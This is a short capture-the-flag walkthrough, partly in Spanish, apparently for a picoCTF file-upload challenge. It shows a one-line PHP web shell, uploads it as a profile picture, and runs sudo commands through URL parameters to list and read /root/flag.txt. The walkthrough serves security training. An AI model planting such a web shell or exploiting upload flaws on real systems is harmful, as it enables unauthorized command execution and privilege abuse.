#### Description

A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.

Additional details will be available after launching your challenge instance.

#### Hints 

1.- File upload was not sanitized
2.- Whenever you get a shell on a remote machine, check `sudo -l`



Deacuerdo al codigo, crea en una terminal de linux un archivo php del nombre  "payload.php" , y se verifica el contenido
````
nano payload.php           
`````
con el siguiente contenido:
````
<?php system($_GET['mycommand']); ?>
```````

* En la pagina hay un boton para subir imagenes subes payload.php.
* En el link deve terminar en uploads/payload.php 
* en el link deve terminar en uploads/payload.php?mycommand=sudo -l
* En el link deve terminar en uploads/payload.php?mycommand=sudo ls /root
Y bas buscando entre estos aste terminar con encontrar la ruta de la bandera
http://standard-pizzas.picoctf.net:62186/uploads/payload.php?mycommand=sudo cat /root/flag.txt


Referencias:
https://www.youtube.com/watch?v=IEs3Oiqh-qE


